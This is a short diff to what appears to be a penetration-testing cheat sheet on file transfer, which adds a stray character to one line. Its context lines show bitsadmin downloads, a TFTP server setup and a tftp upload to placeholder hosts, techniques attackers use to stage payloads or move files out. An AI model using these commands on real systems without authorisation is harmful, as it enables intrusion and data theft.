@@ -194,7 +194,7 @@ bitsadmin /transfer n http://<ip_to_upload>/file.txt C:\Windows\Temp\file.txt
 	mkdir -p /home/tftp
 	atftpd --daemon --port 69 /home/tftp
 	```
-- **Client** commands in `cmd.exe`
+- **Client** commands in `cmd.exe` o 
 	- to upload a file (change `ip_address`,`<filename>`)
 	```cmd
 	tftp -i <ip_address> put <filename>
